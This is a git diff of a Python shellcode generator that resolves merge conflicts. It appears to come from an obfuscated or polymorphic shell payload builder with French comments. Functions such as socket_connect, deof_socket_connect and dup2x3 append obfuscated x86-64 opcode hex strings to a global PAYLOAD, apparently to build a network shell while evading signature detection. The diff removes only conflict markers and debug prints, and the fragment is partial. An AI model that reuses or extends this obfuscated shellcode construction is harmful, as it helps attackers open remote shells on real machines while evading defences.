@@ -265,18 +265,9 @@ def socket_connect(ip, port):
         random1 = factorOffus("042a")
         of_string = offus("042a", random1)
         #Inverse en mirroir tout la chaine pour op code
-<<<<<<< HEAD
-        of_string = of_stringw[::-1]
-        print("2:", of_string)
-        PAYLOAD += clean("rbx")
-        PAYLOAD += "48bb"
-        PAYLOAD+= of_string
-        print("2: ", add_string)
-=======
         of_string = of_string[::-1]
         PAYLOAD+=of_string
 
->>>>>>> 6609b161b09fce55e429baa7eefee3cb6c683812
         #Désoffuscation
         deof_string = deOffus(random1, add_string)
         #Inverse en mirroir tout la chaine pour op code
@@ -285,7 +276,6 @@ def socket_connect(ip, port):
 
         #PAYLOAD+=clean("rbx")       #   xor/sub rbx, rbx
         #PAYLOAD += "48bb"           #   push rbx
-
    else :
         #Offuscation
         random1 = factorOffus("b02a")
@@ -293,10 +283,6 @@ def socket_connect(ip, port):
 
         #Inverse en mirroir tout la chaine pour op code
         of_string = of_string[::-1]
-<<<<<<< HEAD
-        print("2:", of_string)
-=======
->>>>>>> 6609b161b09fce55e429baa7eefee3cb6c683812
         PAYLOAD+=of_string
 
         #Désoffuscation
@@ -351,11 +337,7 @@ def socket_connect(ip, port):
    PAYLOAD += add_string
    return PAYLOAD
 
-<<<<<<< HEAD
 '''
-=======
-"""
->>>>>>> 6609b161b09fce55e429baa7eefee3cb6c683812
 def deof_socket_connect(ip, port):
     global PAYLOAD
     l = ["4889C74989FA", "4889C74989C2", "50415A4C89D7", "4989C24889C7"] # mov rdi, rax; mov r10, rax | push rax; pop rdi; mov r10, rdi | push rax; pop r10; mov rdi, r10 | mov r10, rax ; mov rdi, rax
@@ -394,12 +376,7 @@ def deof_socket_connect(ip, port):
     PAYLOAD += "b218" # mov dl,24
     PAYLOAD += call()
     return PAYLOAD
-<<<<<<< HEAD
 '''
-=======
-"""
-
->>>>>>> 6609b161b09fce55e429baa7eefee3cb6c683812
 def dup2x3():
     global PAYLOAD
     PAYLOAD += clean('rax')
